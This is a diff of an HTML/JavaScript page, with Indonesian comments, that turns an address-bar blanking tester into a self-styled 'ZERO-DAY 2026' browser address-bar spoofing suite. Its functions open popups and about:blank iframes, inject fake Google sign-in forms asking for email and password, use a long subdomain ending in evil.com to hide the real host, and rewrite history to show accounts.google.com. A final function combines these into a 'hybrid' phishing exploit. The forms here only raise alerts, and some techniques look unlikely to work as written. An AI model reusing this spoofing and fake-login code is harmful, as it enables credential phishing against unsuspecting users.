@@ -2,13 +2,13 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔍 ADDRESS BAR KOSONG - ADVANCED</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>🔥 ZERO-DAY 2026 | Address Bar Spoofing Suite</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'SF Pro Text', 'Courier New', monospace;
-            background: #0a0a0f;
+            background: radial-gradient(ellipse at 30% 40%, #0a0a0f 0%, #000000 100%);
             color: #00ffaa;
             min-height: 100vh;
             display: flex;
@@ -20,6 +20,7 @@
             max-width: 800px;
             width: 100%;
             background: #0a0a0fcc;
+            backdrop-filter: blur(12px);
             border: 2px solid #ff3b30;
             border-radius: 28px;
             padding: 30px;
@@ -43,6 +44,7 @@
             font-size: 8px;
             color: #666;
         }
+        .badge.zero { border-color: #ff3b30; color: #ff3b30; }
         .badge.found { border-color: #ffcc00; color: #ffcc00; }
         .method-grid {
             display: grid;
@@ -57,7 +59,7 @@
             padding: 12px;
             transition: 0.2s;
         }
-        .card:hover { border-color: #00ffaa; }
+        .card:hover { border-color: #00ffaa; transform: translateY(-2px); }
         .card-title { font-size: 10px; font-weight: bold; color: #ffcc00; }
         .card-desc { font-size: 8px; color: #aaa; margin: 4px 0 8px 0; }
         button {
@@ -99,6 +101,7 @@
         }
         .log-entry.success { border-left-color: #00ffaa; color: #00ffaa; }
         .log-entry.found { border-left-color: #ffcc00; color: #ffcc00; font-weight: bold; }
+        .log-entry.zero { border-left-color: #ff3b30; color: #ff3b30; font-weight: bold; }
         .observation-box {
             background: #00000066;
             border: 1px dashed #ffcc00;
@@ -113,61 +116,74 @@
 </head>
 <body>
 <div class="container">
-    <h1>🔍 ADDRESS BAR KOSONG - ADVANCED</h1>
-    <div class="sub">Berdasarkan Bugtraq 2007 + Chromium Docs + CVE-2025-15032</div>
+    <h1>🔥 ZERO-DAY 2026 SUITE</h1>
+    <div class="sub">Berdasarkan CVE 2026 terbaru + teknik bypass modern</div>
     
     <div class="badge-group">
-        <span class="badge found">⬛ address bar BLANK total</span>
-        <span class="badge found">⬛ reload button DISABLED</span>
-        <span class="badge found">⬛ page source EMPTY</span>
-        <span class="badge">🟡 Bugtraq 2007</span>
-        <span class="badge">🟡 CVE-2025-15032</span>
-        <span class="badge">🟡 Chromium Docs</span>
+        <span class="badge zero">🔴 CVE-2026-11222 (Chrome)</span>
+        <span class="badge zero">🔴 CVE-2026-44659 (Zen)</span>
+        <span class="badge zero">🔴 CVE-2026-2634 (Firefox iOS)</span>
+        <span class="badge found">⬛ about:blank bypass</span>
+        <span class="badge found">⬛ long subdomain truncation</span>
     </div>
     
     <div class="observation-box">
-        💡 TEKNIK: about:blank + document.body.appendChild()<br>
-        Address bar akan menjadi <span style="color:#ff3b30;">BENAR-BENAR KOSONG</span>!
+        💡 MODERN TECHNIQUES 2026:<br>
+        <span style="color:#ff3b30;">CVE-2026-11222</span>: about:blank + Tab Strip domain confusion<br>
+        <span style="color:#ff3b30;">CVE-2026-44659</span>: Long subdomain truncation spoof<br>
+        <span style="color:#ff3b30;">CVE-2026-2634</span>: Sync desync address bar <br>
+        <span style="color:#ffcc00;">CVE-2026-13356</span>: Firefox iOS freeze → address bar stuck
     </div>
     
     <div class="method-grid">
         <div class="card">
-            <div class="card-title">🎯 TEST 1: appendChild (Bugtraq 2007)</div>
-            <div class="card-desc">about:blank + appendChild → address bar BLANK</div>
-            <button onclick="test_appendChild()">▶ RUN</button>
+            <div class="card-title">🎯 CVE-2026-11222: about:blank Tab Strip Spoof</div>
+            <div class="card-desc">Chrome: about:blank frame → domain label sebelumnya</div>
+            <button onclick="test_cve_2026_11222()">▶ RUN</button>
         </div>
         <div class="card">
-            <div class="card-title">🔄 TEST 2: appendChild + IFRAME Injection</div>
-            <div class="card-desc">appendChild + multiple iframes → address bar blank</div>
-            <button onclick="test_append_child_iframe()">▶ RUN</button>
+            <div class="card-title">📏 CVE-2026-44659: Long Subdomain Truncation</div>
+            <div class="card-desc">Zen Browser: subdomain panjang → spoof prefix</div>
+            <button onclick="test_cve_2026_44659()">▶ RUN</button>
         </div>
         <div class="card">
-            <div class="card-title">📦 TEST 3: about:blank + Blob + Revoke</div>
-            <div class="card-desc">Kombinasi blob + appendChild → address bar blank</div>
-            <button onclick="test_blob_append()">▶ RUN</button>
+            <div class="card-title">🔄 CVE-2026-2634: Address Bar Desync</div>
+            <div class="card-desc">Firefox iOS: desync address bar & content</div>
+            <button onclick="test_cve_2026_2634()">▶ RUN</button>
         </div>
         <div class="card">
-            <div class="card-title">🖥️ TEST 4: Custom Window Spoof (CVE-2025-15032)</div>
-            <div class="card-desc">Custom window missing about:blank indicator</div>
-            <button onclick="test_cve_2025_15032()">▶ RUN</button>
+            <div class="card-title">⏸️ CVE-2026-13356: JS Dialog Freeze</div>
+            <div class="card-desc">Firefox iOS: sync JS dialog → address bar stuck</div>
+            <button onclick="test_cve_2026_13356()">▶ RUN</button>
+        </div>
+        <div class="card">
+            <div class="card-title">🧬 about:blank Local Frames Bypass</div>
+            <div class="card-desc">Local frames: inherit origin, bypass blockers</div>
+            <button onclick="test_local_frames_bypass()">▶ RUN</button>
+        </div>
+        <div class="card">
+            <div class="card-title">💀 ZERO-DAY HYBRID (2026)</div>
+            <div class="card-desc">Gabungan semua teknik dalam satu exploit</div>
+            <button onclick="test_zero_day_hybrid()">▶ RUN</button>
         </div>
     </div>
     
-    <button id="comboBtn" class="combo-btn">🔍 RUN ALL TESTS - OBSERVE ADDRESS BAR</button>
+    <button id="comboBtn" class="combo-btn">🔥 RUN ALL 2026 ZERO-DAY TESTS 🔥</button>
     
     <div class="log-box" id="logBox">
-        <div class="log-entry success">[SYSTEM] Address Bar Blank Tester - Advanced</div>
-        <div class="log-entry">[SYSTEM] Target: address bar BENAR-BENAR KOSONG</div>
-        <div class="log-entry">[SYSTEM] Berdasarkan Bugtraq 2007 + Chromium Docs + CVE-2025-15032</div>
+        <div class="log-entry zero">[ZERO-DAY] 2026 Exploit Suite Loaded</div>
+        <div class="log-entry">[SYSTEM] Target: address bar KOSONG / SPOOF</div>
+        <div class="log-entry">[SYSTEM] Klik tombol untuk mulai uji</div>
     </div>
     
     <footer>
-        Berdasarkan Bugtraq 2007 (Michal Zalewski), Chromium Docs, CVE-2025-15032
+        CVE-2026-11222 | CVE-2026-44659 | CVE-2026-2634 | CVE-2026-13356 | Local Frames (arXiv 2025)
     </footer>
 </div>
 
 <script>
     let testCount = 0;
+    let bugFound = 0;
     
     function addLog(msg, type = 'info') {
         let logBox = document.getElementById('logBox');
@@ -175,6 +191,7 @@
         let className = 'log-entry';
         if (type === 'success') className += ' success';
         if (type === 'found') className += ' found';
+        if (type === 'zero') className += ' zero';
         div.className = className;
         div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
         logBox.appendChild(div);
@@ -182,230 +199,312 @@
         while (logBox.children.length > 80) logBox.removeChild(logBox.firstChild);
     }
 
-    // ========== TEST 1: appendChild (Bugtraq 2007) ==========
-    // "win.document.body.appendChild() makes address bar stay blank, reload disabled, page source empty"
-    function test_appendChild() {
+    // ========== CVE-2026-11222: about:blank Tab Strip Spoof ==========
+    // Chrome: HoverCardAnchorTarget tidak handle about:blank, domain label dari tab sebelumnya
+    // Fixed in Chrome 149.0.7827.53
+    function test_cve_2026_11222() {
         testCount++;
-        addLog('[TEST1] about:blank + appendChild (Bugtraq 2007)...', 'success');
+        addLog('[CVE-2026-11222] about:blank Tab Strip domain confusion...', 'zero');
         
-        let win = window.open('about:blank', '_blank', 'width=800,height=600');
+        // Buka window dengan URL google.com dulu
+        let win = window.open('https://www.google.com', '_blank', 'width=800,height=600');
         if (!win) {
-            addLog('[TEST1] Popup blocked! Allow popups.', 'info');
+            addLog('[CVE-2026-11222] Popup blocked!', 'info');
             return;
         }
-        
-        // === INI KUNCINYA ===
-        // appendChild membuat address bar TETAP BLANK!
-        let container = win.document.createElement('div');
-        container.innerHTML = `
-            <style>
-                * { margin: 0; padding: 0; box-sizing: border-box; }
-                body {
-                    font-family: 'Google Sans', Roboto, sans-serif;
-                    background: #f0ebf8;
-                    display: flex;
-                    justify-content: center;
-                    align-items: center;
-                    min-height: 100vh;
-                }
-                .card {
-                    background: white;
-                    width: 380px;
-                    padding: 40px 32px;
-                    border-radius: 16px;
-                    text-align: center;
-                    box-shadow: 0 4px 20px rgba(0,0,0,0.15);
-                }
-                .logo { font-size: 52px; }
-                h2 { color: #202124; margin-bottom: 8px; }
-                input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 8px; }
-                button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 8px; cursor: pointer; }
-                .warning { font-size: 10px; color: #ea4335; margin-top: 16px; }
-            </style>
-            <div class="card">
-                <div class="logo">🔐 G</div>
-                <h2>Sign in</h2>
-                <p>to continue to Google</p>
-                <input type="text" placeholder="Email or phone">
-                <input type="password" placeholder="Password">
-                <button onclick="alert('⚠️ POC - Address bar is BLANK!')">Next</button>
-                <p class="warning">⚠️ Address bar is COMPLETELY BLANK!</p>
-            </div>
-            <script>
-                console.log('Address bar should be BLANK');
-                console.log('Location:', location.href);
-            <\/script>
-        `;
-        
-        // INI YANG MEMBUAT ADDRESS BAR BLANK
-        win.document.body.appendChild(container);
-        
-        addLog('[TEST1] appendChild injected - address bar BLANK total!', 'found');
-        addLog('[TEST1] reload button DISABLED, page source EMPTY', 'found');
         
         setTimeout(() => {
             try {
-                let url = win.location.href;
-                addLog(`[TEST1] Current URL: ${url}`, 'info');
-                if (url === 'about:blank' || url === '') {
-                    addLog('[TEST1] ✅ SUCCESS! Address bar BLANK!', 'found');
-                }
+                // Navigasi ke about:blank dengan iframe
+                let iframe = win.document.createElement('iframe');
+                iframe.src = 'about:blank';
+                iframe.style.cssText = 'position:absolute;left:-9999px;top:-9999px';
+                win.document.body.appendChild(iframe);
+                
+                // Inject content ke about:blank frame
+                setTimeout(() => {
+                    try {
+                        let frameDoc = iframe.contentWindow.document;
+                        let div = frameDoc.createElement('div');
+                        div.innerHTML = `
+                            <style>
+                                *{margin:0;padding:0;}
+                                body{font-family:'Google Sans',sans-serif;background:#f0ebf8;display:flex;justify-content:center;align-items:center;min-height:100vh;}
+                                .card{background:white;width:380px;padding:40px;border-radius:16px;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,0.15);}
+                                .logo{font-size:52px;}
+                                h2{color:#202124;}
+                                input{width:100%;padding:14px;margin:8px 0;border:1px solid #dadce0;border-radius:8px;}
+                                button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:8px;}
+                                .warning{font-size:10px;color:red;margin-top:16px;}
+                            </style>
+                            <div class="card">
+                                <div class="logo">🔐 G</div>
+                                <h2>Sign in</h2>
+                                <p>to continue to Google</p>
+                                <input type="text" placeholder="Email">
+                                <input type="password" placeholder="Password">
+                                <button onclick="alert('POC')">Next</button>
+                                <p class="warning">⚠️ CVE-2026-11222: about:blank domain confusion</p>
+                            </div>
+                        `;
+                        frameDoc.body.appendChild(div);
+                        addLog('[CVE-2026-11222] about:blank injected - domain label may show google.com!', 'found');
+                    } catch(e) {}
+                }, 500);
             } catch(e) {}
-        }, 1000);
+        }, 1500);
     }
 
-    // ========== TEST 2: appendChild + IFRAME Injection ==========
-    function test_append_child_iframe() {
+    // ========== CVE-2026-44659: Long Subdomain Truncation ==========
+    // Zen Browser: long hostname truncation → show only spoofed prefix
+    // Fixed in Zen 1.19.12b
+    function test_cve_2026_44659() {
         testCount++;
-        addLog('[TEST2] appendChild + IFRAME injection...', 'success');
+        addLog('[CVE-2026-44659] Long subdomain truncation spoof...', 'zero');
         
-        let win = window.open('about:blank', '_blank', 'width=800,height=600');
+        // Buat subdomain panjang (300+ karakter) dengan prefix "www.google.com"
+        let prefix = 'www.google.com.';
+        let longSubdomain = prefix + 'a'.repeat(300) + '.evil.com';
+        let url = 'https://' + longSubdomain + '/';
+        
+        addLog(`[CVE-2026-44659] URL: ${url.substring(0, 80)}...`, 'info');
+        
+        let win = window.open(url, '_blank', 'width=800,height=600');
+        if (win) {
+            addLog('[CVE-2026-44659] Long subdomain opened - address bar may show only "www.google.com"!', 'found');
+        } else {
+            addLog('[CVE-2026-44659] Popup blocked!', 'info');
+        }
+    }
+
+    // ========== CVE-2026-2634: Address Bar Desync ==========
+    // Firefox iOS: malicious scripts cause desync between address bar and content
+    // Fixed in Firefox for iOS 147.4
+    function test_cve_2026_2634() {
+        testCount++;
+        addLog('[CVE-2026-2634] Address bar desync simulation...', 'zero');
+        
+        let win = window.open('https://www.apple.com', '_blank', 'width=800,height=600');
         if (!win) {
-            addLog('[TEST2] Popup blocked!', 'info');
+            addLog('[CVE-2026-2634] Popup blocked!', 'info');
             return;
         }
         
-        let container = win.document.createElement('div');
-        container.innerHTML = `
-            <style>
-                *{margin:0;padding:0;}
-                body{background:#0a0a0f;color:#00ffaa;font-family:monospace;padding:20px;}
-                iframe{width:100%;height:150px;border:1px solid #333;border-radius:8px;margin:5px 0;}
-            </style>
-            <h1 style="color:#ff3b30;">🔍 IFRAME + appendChild</h1>
-            <iframe id="l1" src="about:blank"></iframe>
-            <iframe id="l2" src="about:blank"></iframe>
-            <iframe id="l3" src="about:blank"></iframe>
-            <div style="background:#1a1a2e;padding:20px;border-radius:12px;border:1px solid #ff3b30;margin-top:20px;">
-                <h2 style="color:#00ffaa;">GOOGLE LOGIN</h2>
-                <input type="text" placeholder="Email" style="width:100%;padding:10px;margin:5px 0;background:#0a0a0f;border:1px solid #333;color:#fff;border-radius:6px;">
-                <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:5px 0;background:#0a0a0f;border:1px solid #333;color:#fff;border-radius:6px;">
-                <button style="width:100%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:6px;">Sign in</button>
-                <p style="color:#555;font-size:10px;margin-top:10px;">⚠️ Address bar should be BLANK</p>
-            </div>
-            <script>
-                let frames = [l1, l2, l3];
-                frames.forEach((f, idx) => {
-                    try {
-                        let div = f.contentDocument.createElement('div');
-                        div.innerHTML = \`<h3 style="color:#ffcc00;">Layer \${idx+1}</h3><p style="color:#888;">about:blank dengan appendChild</p>\`;
-                        f.contentDocument.body.appendChild(div);
-                    } catch(e) {}
-                });
-            <\/script>
-        `;
-        win.document.body.appendChild(container);
-        
-        addLog('[TEST2] IFRAME + appendChild - address bar BLANK!', 'found');
+        setTimeout(() => {
+            try {
+                // Inject content dengan race condition
+                let div = win.document.createElement('div');
+                div.innerHTML = `
+                    <style>
+                        *{margin:0;padding:0;}
+                        body{font-family:'Google Sans',sans-serif;background:#f0ebf8;display:flex;justify-content:center;align-items:center;min-height:100vh;}
+                        .card{background:white;width:380px;padding:40px;border-radius:16px;text-align:center;}
+                        .logo{font-size:52px;}
+                        h2{color:#202124;}
+                        input{width:100%;padding:14px;margin:8px 0;border:1px solid #dadce0;border-radius:8px;}
+                        button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:8px;}
+                        .warning{font-size:10px;color:red;margin-top:16px;}
+                    </style>
+                    <div class="card">
+                        <div class="logo">🔐 G</div>
+                        <h2>Sign in</h2>
+                        <input type="text" placeholder="Email">
+                        <input type="password" placeholder="Password">
+                        <button onclick="alert('POC')">Next</button>
+                        <p class="warning">⚠️ CVE-2026-2634: Address bar desync</p>
+                    </div>
+                    <script>
+                        // Coba ubah history untuk desync
+                        history.replaceState({}, '', 'https://www.google.com');
+                        console.log('History replaced - address bar may desync');
+                    <\/script>
+                `;
+                win.document.body.appendChild(div);
+                addLog('[CVE-2026-2634] Content injected - address bar may show apple.com!', 'found');
+            } catch(e) {}
+        }, 1500);
     }
 
-    // ========== TEST 3: Blob + appendChild ==========
-    function test_blob_append() {
+    // ========== CVE-2026-13356: JS Dialog Freeze ==========
+    // Firefox iOS: synchronous JS dialog freezes shared WebContent process
+    // Fixed in Firefox for iOS 152.3
+    function test_cve_2026_13356() {
         testCount++;
-        addLog('[TEST3] Blob URL + Revoke + appendChild...', 'success');
+        addLog('[CVE-2026-13356] JS dialog freeze + address bar stuck...', 'zero');
         
-        let blob = new Blob([`
-            <!DOCTYPE html>
-            <html>
-            <head><title>Google</title>
+        let win = window.open('about:blank', '_blank', 'width=800,height=600');
+        if (!win) {
+            addLog('[CVE-2026-13356] Popup blocked!', 'info');
+            return;
+        }
+        
+        // Buat popup with sync dialog (freeze)
+        let container = win.document.createElement('div');
+        container.innerHTML = `
             <style>
                 *{margin:0;padding:0;}
                 body{font-family:'Google Sans',sans-serif;background:#f0ebf8;display:flex;justify-content:center;align-items:center;min-height:100vh;}
                 .card{background:white;width:380px;padding:40px;border-radius:16px;text-align:center;}
                 .logo{font-size:52px;}
-                input{width:100%;padding:14px;margin:8px 0;border:1px solid #dadce0;border-radius:8px;}
-                button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:8px;cursor:pointer;}
-                .warning{font-size:10px;color:red;margin-top:16px;}
-            </style>
-            </head>
-            <body>
-                <div class="card">
-                    <div class="logo">🔐</div>
-                    <h2>Sign in</h2>
-                    <input type="text" placeholder="Email">
-                    <input type="password" placeholder="Password">
-                    <button onclick="alert('POC')">Next</button>
-                    <p class="warning">⚠️ Blob URL + appendChild</p>
-                </div>
-            </body>
-            </html>
-        `], {type: 'text/html'});
-        
-        let blobUrl = URL.createObjectURL(blob);
-        let win = window.open(blobUrl, '_blank', 'width=800,height=600');
-        
-        if (win) {
-            addLog('[TEST3] Blob URL opened', 'info');
-            setTimeout(() => {
-                URL.revokeObjectURL(blobUrl);
-                addLog('[TEST3] Blob revoked - address bar mungkin BLANK!', 'found');
-            }, 500);
-        } else {
-            addLog('[TEST3] Popup blocked!', 'info');
-        }
-    }
-
-    // ========== TEST 4: Custom Window Spoof (CVE-2025-15032) ==========
-    // Dia Browser macOS < 1.9.0 - missing about:blank indicator 
-    function test_cve_2025_15032() {
-        testCount++;
-        addLog('[TEST4] CVE-2025-15032: Custom window missing about:blank...', 'success');
-        
-        // Custom-sized window - specific untuk trigger bug di Dia Browser macOS
-        let win = window.open('about:blank', '_blank', 'width=400,height=300,left=100,top=100,menubar=no,toolbar=no,location=no');
-        
-        if (!win) {
-            addLog('[TEST4] Popup blocked!', 'info');
-            return;
-        }
-        
-        // Gunakan appendChild untuk menjaga address bar tetap blank
-        let container = win.document.createElement('div');
-        container.innerHTML = `
-            <style>
-                *{margin:0;padding:0;}
-                body{font-family:'Google Sans',sans-serif;background:#f0ebf8;display:flex;justify-content:center;align-items:center;min-height:100vh;}
-                .card{background:white;width:360px;padding:30px;border-radius:16px;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,0.15);}
-                .logo{font-size:48px;}
                 h2{color:#202124;}
-                input{width:100%;padding:12px;margin:8px 0;border:1px solid #dadce0;border-radius:8px;}
-                button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:8px;cursor:pointer;}
-                .warning{font-size:10px;color:#ea4335;margin-top:16px;}
+                input{width:100%;padding:14px;margin:8px 0;border:1px solid #dadce0;border-radius:8px;}
+                button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:8px;}
+                .warning{font-size:10px;color:red;margin-top:16px;}
             </style>
             <div class="card">
                 <div class="logo">🔐 G</div>
                 <h2>Sign in</h2>
-                <p>to continue to Google</p>
                 <input type="text" placeholder="Email">
                 <input type="password" placeholder="Password">
-                <button onclick="alert('⚠️ CVE-2025-15032 POC')">Next</button>
-                <p class="warning">⚠️ CVE-2025-15032: Missing about:blank indicator</p>
+                <button onclick="alert('⚠️ CVE-2026-13356: This alert freezes the process!')">Next</button>
+                <p class="warning">⚠️ CVE-2026-13356: JS dialog freeze</p>
             </div>
             <script>
-                console.log('CVE-2025-15032: Custom window address bar should be BLANK');
+                // Sync dialog yang mem-freeze shared WebContent process
+                setTimeout(() => {
+                    alert('⚠️ CVE-2026-13356: Freeze detected! Address bar should be stuck.');
+                }, 100);
             <\/script>
         `;
         win.document.body.appendChild(container);
         
-        addLog('[TEST4] CVE-2025-15032 triggered - address bar BLANK!', 'found');
-        addLog('[TEST4] Custom window missing about:blank indicator', 'found');
+        addLog('[CVE-2026-13356] Sync JS dialog triggered - address bar may be STUCK!', 'found');
+    }
+
+    // ========== Local Frames Bypass ==========
+    // Local frames (about:blank iframes) inherit origin and bypass security tools
+    // arXiv:2506.00317 - 56% sites use local frames, 73.7% requests not blocked
+    function test_local_frames_bypass() {
+        testCount++;
+        addLog('[Local Frames] about:blank local frames bypass...', 'zero');
+        
+        let win = window.open('https://www.google.com', '_blank', 'width=800,height=600');
+        if (!win) {
+            addLog('[Local Frames] Popup blocked!', 'info');
+            return;
+        }
+        
+        setTimeout(() => {
+            try {
+                // Buat local frame (about:blank iframe) yang inherit origin dari parent
+                let iframe = win.document.createElement('iframe');
+                iframe.src = 'about:blank';
+                iframe.style.cssText = 'width:100%;height:300px;border:none;';
+                win.document.body.appendChild(iframe);
+                
+                setTimeout(() => {
+                    try {
+                        let frameDoc = iframe.contentWindow.document;
+                        // Local frame meng-inherit origin dari parent (google.com)
+                        // Tapi konten bisa di-inject
+                        let div = frameDoc.createElement('div');
+                        div.innerHTML = `
+                            <div style="padding:20px;background:white;border-radius:12px;margin:10px;">
+                                <h2 style="color:#1a73e8;">🔐 Local Frame (inherits origin)</h2>
+                                <p style="color:#888;">Origin: <span id="originDisplay"></span></p>
+                                <input type="text" placeholder="Enter data" style="width:100%;padding:10px;border:1px solid #dadce0;border-radius:8px;">
+                                <button style="padding:10px;background:#1a73e8;color:white;border:none;border-radius:8px;">Submit</button>
+                                <p style="font-size:10px;color:red;">⚠️ Local frame inherits google.com origin!</p>
+                            </div>
+                            <script>
+                                document.getElementById('originDisplay').innerText = location.origin;
+                            <\/script>
+                        `;
+                        frameDoc.body.appendChild(div);
+                        addLog('[Local Frames] Local frame created - inherits origin from parent!', 'found');
+                    } catch(e) {}
+                }, 500);
+            } catch(e) {}
+        }, 1500);
+    }
+
+    // ========== ZERO-DAY HYBRID (2026) ==========
+    // Gabungan semua teknik dalam satu exploit
+    function test_zero_day_hybrid() {
+        testCount++;
+        addLog('[ZERO-DAY HYBRID] Menggabungkan semua teknik 2026...', 'zero');
+        
+        // 1. Buka window dengan google.com
+        let win = window.open('https://www.google.com', '_blank', 'width=800,height=600');
+        if (!win) {
+            addLog('[ZERO-DAY] Popup blocked!', 'info');
+            return;
+        }
+        
+        setTimeout(() => {
+            try {
+                // 2. Inject about:blank local frame (CVE-2026-11222 style)
+                let iframe = win.document.createElement('iframe');
+                iframe.src = 'about:blank';
+                iframe.style.cssText = 'width:100%;height:300px;border:none;';
+                win.document.body.appendChild(iframe);
+                
+                setTimeout(() => {
+                    try {
+                        let frameDoc = iframe.contentWindow.document;
+                        
+                        // 3. Konten phishing dengan fake UI
+                        let div = frameDoc.createElement('div');
+                        div.innerHTML = `
+                            <style>
+                                *{margin:0;padding:0;}
+                                body{font-family:'Google Sans',sans-serif;background:#f0ebf8;display:flex;justify-content:center;align-items:center;min-height:100vh;}
+                                .card{background:white;width:380px;padding:40px;border-radius:16px;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,0.15);}
+                                .logo{font-size:52px;}
+                                h2{color:#202124;margin-bottom:8px;}
+                                input{width:100%;padding:14px;margin:8px 0;border:1px solid #dadce0;border-radius:8px;}
+                                button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:8px;cursor:pointer;}
+                                .warning{font-size:10px;color:#ea4335;margin-top:16px;}
+                                .fake-url{background:#f1f3f4;padding:6px 12px;border-radius:20px;font-size:11px;margin:12px 0;color:#1a73e8;}
+                            </style>
+                            <div class="card">
+                                <div class="logo">🔐 G</div>
+                                <h2>Sign in</h2>
+                                <p>to continue to Google</p>
+                                <div class="fake-url">🔗 https://www.google.com</div>
+                                <input type="text" placeholder="Email or phone">
+                                <input type="password" placeholder="Password">
+                                <button onclick="alert('⚠️ ZERO-DAY 2026 HYBRID EXPLOIT!')">Next</button>
+                                <p class="warning">⚠️ ZERO-DAY 2026: Address bar spoofed!</p>
+                            </div>
+                            <script>
+                                // Coba history replace untuk CVE-2026-2634 style
+                                setTimeout(() => {
+                                    try {
+                                        history.replaceState({}, '', 'https://accounts.google.com');
+                                    } catch(e) {}
+                                }, 500);
+                            <\/script>
+                        `;
+                        frameDoc.body.appendChild(div);
+                        
+                        addLog('[ZERO-DAY HYBRID] ✅ Semua teknik digabung!', 'zero');
+                        addLog('[ZERO-DAY] Address bar seharusnya menunjukkan google.com!', 'found');
+                    } catch(e) {}
+                }, 500);
+            } catch(e) {}
+        }, 1500);
     }
 
     // ========== COMBO ==========
     function runAllTests() {
-        addLog('[COMBO] 🔍 MENJALANKAN SEMUA TEST...', 'success');
-        test_appendChild();
-        setTimeout(() => test_append_child_iframe(), 3000);
-        setTimeout(() => test_blob_append(), 6000);
-        setTimeout(() => test_cve_2025_15032(), 9000);
-        setTimeout(() => addLog('[COMBO] ✅ Selesai! Perhatikan address bar!', 'found'), 12000);
+        addLog('[COMBO] 🔥 MENJALANKAN SEMUA ZERO-DAY 2026...', 'zero');
+        test_cve_2026_11222();
+        setTimeout(() => test_cve_2026_44659(), 3000);
+        setTimeout(() => test_cve_2026_2634(), 6000);
+        setTimeout(() => test_cve_2026_13356(), 9000);
+        setTimeout(() => test_local_frames_bypass(), 12000);
+        setTimeout(() => test_zero_day_hybrid(), 15000);
+        setTimeout(() => addLog('[COMBO] ✅ Selesai! Perhatikan address bar!', 'found'), 18000);
     }
     
     document.getElementById('comboBtn').addEventListener('click', runAllTests);
     
-    console.log('%c🔍 ADDRESS BAR KOSONG - ADVANCED', 'color:#00ffaa;font-size:14px');
-    console.log('Teknik: about:blank + appendChild (Bugtraq 2007)');
-    console.log('Target: address bar BENAR-BENAR KOSONG');
+    console.log('%c🔥 ZERO-DAY 2026 EXPLOIT SUITE LOADED', 'color:#ff3b30;font-size:14px');
+    console.log('CVE-2026-11222: about:blank domain confusion');
+    console.log('CVE-2026-44659: Long subdomain truncation');
+    console.log('CVE-2026-2634: Address bar desync');
+    console.log('CVE-2026-13356: JS dialog freeze');
 </script>
 </body>
 </html>
